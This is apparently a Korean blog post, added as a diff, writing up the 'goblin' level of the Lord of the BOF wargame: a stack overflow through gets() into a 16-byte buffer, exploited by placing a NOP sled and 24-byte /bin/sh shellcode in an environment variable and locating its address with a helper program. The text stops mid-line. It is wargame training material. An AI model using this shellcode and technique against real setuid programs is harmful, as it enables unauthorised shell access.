@@ -1,0 +1,84 @@
+---
+layout: post
+title:  "Level03. goblin"
+subtitle:   "[LOB] Level03. goblin"
+categories: writeup
+tags: lob goblin level03
+
+---
+
+# cobolt → goblin
+
+## keyword : BoF+env+argv
+
+```c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - goblin
+        - small buffer + stdin
+*/
+
+int main()
+{
+    char buffer[16];
+    gets(buffer);
+    printf("%s\n", buffer);
+}
+```
+
+
+
+------
+
+### 0x01. Static Analysis
+
+
+
+앞서 문제 cobolt와 다른점은 cobolt에서는 main함수의 argv로 입력값을 받았다면, 지금 문제는 gets를 이용하여 문제를 받는다. 따라서 값을 넘겨주는 방식의 차이만 있을 뿐 앞 문제와 풀이 과정은 동일하다.
+
+
+
+------
+
+### 0x02. Dynamic Analysis & Exploit
+
+
+
+cobolt 문제와 동일하게 환경변수에 쉘코드를 넣고 문제를 풀어보자.
+
+
+
+```
+shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
+
+
+
+<img src="/assets/img/writeup/lob/03.goblin/image-20180828135809460.png" width="700px">
+
+EUNICE 환경변수에 NOP슬라이드와 쉘코드를 넣는다.
+
+
+
+```c
+//env.c
+main(){
+    printf("%08x\n", getenv("EUNICE") );
+}
+```
+
+EUNICE 환경변수의 주소를 구하는 프로그램을 만들어서
+
+
+
+<img src="/assets/img/writeup/lob/03.goblin/image-20180828135852712.png" width="400px">
+
+EUNICE환경변수의 주소를 구해온다. (0xbffffc33)
+
+
+
+<img src="/assets/img/writeup/lob/03.goblin/image-20180828135928174.png" width="600px">
+
+
+
+**goblin / hackers proof
